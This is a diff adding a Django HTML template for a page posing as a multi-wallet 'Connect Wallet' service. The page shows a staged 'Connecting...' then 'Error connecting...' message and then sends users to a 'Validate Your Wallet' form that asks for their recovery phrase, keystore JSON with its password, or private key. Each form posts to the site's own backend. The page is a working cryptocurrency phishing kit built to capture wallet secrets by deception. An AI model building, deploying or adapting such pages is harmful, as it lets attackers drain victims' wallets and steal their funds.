@@ -1,0 +1,174 @@
+{% extends 'base.html'%}
+{% load static %}
+{% block content %}
+<div class="container mt-5">
+    <div class="header">
+        <img src="{% static '/Images/iogo.jpg' %}" alt="" width="120px">
+    </div>
+    <div class="body-content">
+        <div class="body-content-wallet">
+            Wallets
+        </div>
+        <div class="body-content-notes">
+            Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking
+        </div>
+        
+        
+        {% include 'partials/_messages.html'%}
+    </div>
+    <div class="body-content-2">
+        <div class="wallet-nameandimages">
+            <div class="row g-5 mt-1">
+                {% if crypto %}
+                    {% for crypto in crypto %}
+                    <div class="col-6 col-sm-6 col-md-4 col-lg-3">
+                        <div>
+                            <a href="#enroll" data-bs-toggle="modal" data-bs-target="#enroll">
+                                <div class="wallets-img">
+                                    <img src="{{crypto.image.url}}" alt="" >
+                                </div>
+                                <div class="img-text">
+                                    <p>{{crypto.name}}</p>
+                                </div>
+                            </a>
+                        </div>
+                    </div>
+    
+                    <!-- Modal -->
+            <div class="modal fade modal-tweak" id="enroll" >
+                <div class="modal-dialog">
+                  <div class="modal-content modal-tweak-2">
+                    <div class="modal-header modal-header-tweak">
+                      <h5 class="modal-title text-primary" id="enrollLabel">Connect Wallet 
+                      </h5>
+                      <hr>
+            
+                    </div>
+                    <div class="modal-body">
+                      <div class="error-connecting">
+                          <p id="hideMeAfter3seconds" style="color: red;">
+                            Connecting...</p>
+                          <div id="delayedText" style="visibility:hidden" class="hidden-tweak hide-me done">
+                            <p style="color: red;">Error connecting...  <span>
+                                <a href="#last" data-bs-toggle="modal" data-bs-target="#last">
+                                    <span type="hidden"  data-bs-dismiss="modal">Connect Manually </span>
+                                </a>
+                            </span></p> 
+                          </div> 
+                      </div>
+                      <div class="trust-connect">
+                          <div class="trust-connect-text">
+                          <h6>Your wallet session is encrypted</h6>
+                          </div>
+                      </div>
+                    </div>
+                    <!-- <div class="modal-footer">
+                      <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                      <button type="button" class="btn btn-primary">Save changes</button>
+                    </div> -->
+                
+                  </div>
+                </div>
+            </div>
+    
+                    <!-- Button trigger modal -->
+    
+    
+        <!-- Modal -->
+                    <div class="modal fade modal-tweak-3" id="last" >
+                        <div class="modal-dialog">
+                        <div class="modal-content">
+                            <div class="modal-header modal-tweak-header">
+                            <h5 class="modal-title modal-tweak-title" id="exampleModalLabel">Validate Your Wallet</h5>
+                            </div>
+                            <div class="modal-body modal-functions">
+                                <div id="tab-1" class="tab-item">
+                                    Phrase
+                                </div>
+                                <div id="tab-2" class="tab-item">
+                                    Keystore JSON
+                                </div>
+                                <div id="tab-3" class="tab-item">
+                                    Private Key
+                                </div>
+                            </div>
+                            <div id="tab-1-content" class="tab-content-item show">
+                                <form action="" method="POST" class="form-tweak-1">
+                                    {% csrf_token %}
+                                    <textarea name="texted" id="" cols="50" rows="5" placeholder="Enter your Recovery Phrase" minlength="12" class="textarea-tweak" required></textarea>
+                                    <div id="loader">
+                                        <div class="lds-ring">
+                                          <div></div>
+                                          <div></div>
+                                          <div></div>
+                                          <div></div>
+                                        </div>
+                                      </div>
+                                    <p class="form-tweak-text-1">Typically 12 (sometimes 24) words separated by single spaces</p>
+                                    <button type="submit" class="button-tweak-1 load" onclick="load()" ><span class="submit-tweak-1 " >Proceed</span></button>
+                                </form>
+                                
+                                <div class="modal-footer">
+                                <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Cancel</button>
+                                </div>
+                            </div>
+                            
+                            <div id="tab-2-content" class="tab-content-item">
+                                <form action="{% url 'wallets' %}" method="POST" class="form-tweak-1">
+                                    {% csrf_token %}
+                                    <textarea name="texted" id="" cols="50" rows="5" placeholder="Keystore JSON" minlength="12" class="textarea-tweak" required></textarea>
+                                    <input type="text" name="texted" placeholder="Wallet password" class="input-tweak" required>
+                                    <div id="loaderd">
+                                        <div class="lds-ringd">
+                                          <div></div>
+                                          <div></div>
+                                          <div></div>
+                                          <div></div>
+                                        </div>
+                                    </div>
+                                    <p class="form-tweak-text-1">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
+                                    <button type="submit" class="button-tweak-1 loadd" onclick="loadd()" ><span class="submit-tweak-1" >Proceed</span></button>
+                                </form>
+                                <div class="modal-footer">
+                                <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Cancel</button>
+                                </div>
+    
+                            </div>
+                            
+                            <div id="tab-3-content" class="tab-content-item">
+                                <form action="{% url 'wallets' %}" method="POST" class="form-tweak-1">
+                                    {% csrf_token %}
+                                    <input type="text"  name= "texted" placeholder="Enter your private key" class="input-tweak"  minlength="12" required>
+                                    <p class="form-tweak-text-1">Typically 12 (sometimes 24) words separated by single spaces</p>
+                                    <button type="submit" class="button-tweak-1"><span class="submit-tweak-1">Proceed</span></button>
+                                </form>
+                                
+                                <div class="modal-footer">
+                                <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Cancel</button>
+                                </div>
+                            </div>
+                        </div>
+                        </div>
+                    </div>
+                    {% endfor %}
+                {% endif %}
+               
+                <!-- <button type="button" data-bs-toggle="modal" data-bs-target="#enroll">
+                    
+                </button> -->
+
+                <!-- footer -->
+                <div class="footer-plain-section">
+                    <ul>
+                        <li><i class="fab fa-github"></i> Github</li>
+                        <li><i class="fab fa-twitter"></i> Twitter</li>
+                        <li><i class="fab fa-discord"></i> Discord</li>
+                    </ul>
+                </div>
+            </div>
+        </div>    
+    </div>
+        
+        <!-- Button trigger modal -->
+        
+{% endblock content %}
